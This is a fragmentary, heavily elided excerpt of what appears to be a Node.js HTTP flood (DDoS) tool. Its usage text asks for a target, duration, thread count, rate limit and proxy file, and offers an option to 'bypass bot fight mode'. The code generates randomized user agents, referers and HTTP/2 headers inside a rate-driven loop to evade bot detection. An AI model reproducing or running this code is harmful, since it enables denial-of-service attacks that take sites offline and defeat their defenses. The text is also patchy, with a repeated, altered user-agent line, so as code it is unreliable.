...
if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
    ...
    console.log(`Example: node bogus GET target 120 7 10 proxy.txt --cdn --delay 1 --full --http 2 --debug --query 1`);
    ...
    Options:
      ...
      --bfm    ( true/false - bypass bot fight mode )
    `);
    process.exit(1);
}
...
const ua = `Mozilla/5.0 (iPhone; CPU iPhone OS 1${randstra(1)}_${randstra(1)} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/${a}.0.5615.70 Mobile/15E148 Safari/604.1`;
		...
		return result;
                ...
                function main() {
                    ...
                    for (let i = 0; i < (isFull ? ratelimit : 1); i++) {
                        ...
                        const secChUaPlatform = isBrave ? 'macOS' : undefined;
...
const ua = `Mozilla/5.0 (iPhone; CPU iPhone OS 1${randstra(1)}_${randstra(1)} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/${a}.0.${b}.${c} Mobile/15E148 Safari/604.1`;
                      ...
                      const currentRefererValue = refererValue === 'rand' ? 'https://' + cc(6, 6) + ".net" : refererValue;
                        ...
                        const headers = Object.entries({
                            ...
                            ":scheme": "https",
                            ":path": query ? handleQuery(query) : url.pathname + getRandomFileExtension() ,
